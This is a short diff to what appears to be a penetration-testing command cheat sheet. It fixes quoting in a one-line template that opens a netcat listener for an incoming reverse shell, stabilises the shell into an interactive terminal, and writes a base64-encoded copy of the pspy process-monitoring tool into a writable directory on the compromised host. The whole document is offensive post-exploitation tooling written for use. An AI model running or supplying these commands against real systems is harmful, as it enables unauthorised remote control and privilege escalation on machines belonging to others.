@@ -16,5 +16,5 @@ stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '
 # pspy listener
 $ writeable_path: echo '/tmp/ /var/tmp/ ~/' | tr ' ' '\n'
 $ pspy_version: echo 'pspy64 pspy' | tr ' ' '\n'
-stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;echo $(locate /pspy | grep -v internal | grep '<pspy_version>$' | xargs cat | base64 -w 0 > <writeable_path>pspy64)");cat) | nc -lvnp <port> && reset
+stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;echo "$(locate /pspy | grep -vi internal | grep '<pspy_version>$' | xargs cat | base64 -w 0) > <writeable_path>pspy64");cat) | nc -lvnp <port> && reset
 
